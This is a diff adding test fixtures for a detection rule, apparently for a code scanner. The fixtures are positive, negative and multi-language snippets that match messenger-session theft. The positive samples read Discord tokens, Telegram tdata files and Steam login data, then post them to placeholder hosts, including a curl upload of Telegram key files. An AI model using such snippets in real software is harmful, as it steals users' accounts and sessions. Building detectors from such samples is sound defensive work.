@@ -26,5 +26,35 @@
       ["java", "Path p = Paths.get(steam, \"config\", \"loginusers.vdf\");"],
       ["sh", "tar czf /tmp/t.tgz \"$HOME/.local/share/TelegramDesktop/tdata\""]
     ]
+  },
+  "exfiltration/messenger-session-exfiltration": {
+    "lang": "js",
+    "pos": [
+      "const dir = path.join(appdata, 'discord', 'Local Storage', 'leveldb');\nconst tokens = scan(dir);\nawait axios.post('https://collector.example.invalid/t', { tokens });",
+      "const hits = lines.filter((l) => l.includes('dQw4w9WgXcQ:'));\nawait fetch(api + '/sendDocument', { method: 'POST', body: form });"
+    ],
+    "neg": [
+      "const dir = path.join(appdata, 'discord', 'Local Storage', 'leveldb');\nconsole.log(fs.readdirSync(dir));",
+      "await axios.post('https://hooks.example.invalid/deploy', { text: 'Deployed, see Discord' });",
+      "const ls = window.localStorage;\nawait fetch('/api/session', { method: 'POST', body: ls.getItem('sid') });"
+    ],
+    "also": [
+      [
+        "py",
+        "p = os.path.join(appdata, 'Telegram Desktop', 'tdata')\nshutil.make_archive('/tmp/t', 'zip', p)\nrequests.post(url, files={'document': open('/tmp/t.zip', 'rb')})"
+      ],
+      [
+        "go",
+        "p := filepath.Join(home, \".local/share/TelegramDesktop/tdata\")\nhttp.Post(u, \"application/zip\", body)"
+      ],
+      [
+        "php",
+        "$f = $steam . '/config/loginusers.vdf';\ncurl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents($f));"
+      ],
+      [
+        "sh",
+        "curl -F \"file=@$HOME/.local/share/TelegramDesktop/tdata/key_datas\" https://x.example.invalid/u"
+      ]
+    ]
   }
 }
